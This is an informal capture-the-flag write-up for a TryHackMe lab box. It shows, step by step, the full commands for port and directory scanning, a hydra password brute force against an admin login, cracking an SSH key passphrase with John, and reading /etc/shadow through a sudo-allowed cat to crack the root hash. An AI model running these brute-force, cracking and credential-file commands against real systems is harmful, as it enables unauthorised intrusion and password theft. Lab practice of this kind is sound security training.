This tryhackme box is an easy brute and cracking box

1. recon

when i opened the website with ip . it showed apache default page
then i scanned it with nmap using "nmap -sV -p- -T5 10.49.174.98 -o nmap.txt"
it showed open ports not some sus port .

I started finding sub domains through gobuster
"gobuster dir -u http://10.49.174.98/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o subdomain.txt "

found a hidden subdomain "/admin"

After checking the source code i found a clue . the username is "admin"

2)Brute force

i used hydra for brute force
"hydra -l admin -P rockyou.txt -t 4 10.49.174.98 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
"
i found a web flag and an rsa key

3. gaining shell

i copied the key from web into a id_rsa file .
then it asked for phassphare

i cracked it with john

"ssh2john id_rsa > hash.txt"
"john --wordlist=rockyou.txt hash.txt"

after that i logged in as john

4. privelage esclation

i found user.txt in home directory

i checked what commands can user run
"sudo -l"

it showed cat
i went on gftobins and used cat to read /etc/shadow "sudo /bin/cat /etc/shadow"

i copied the root hash and used jhon to crack it "john --wordlist=rockyou.txt
hash"

At last i got root acess

Thank you all .
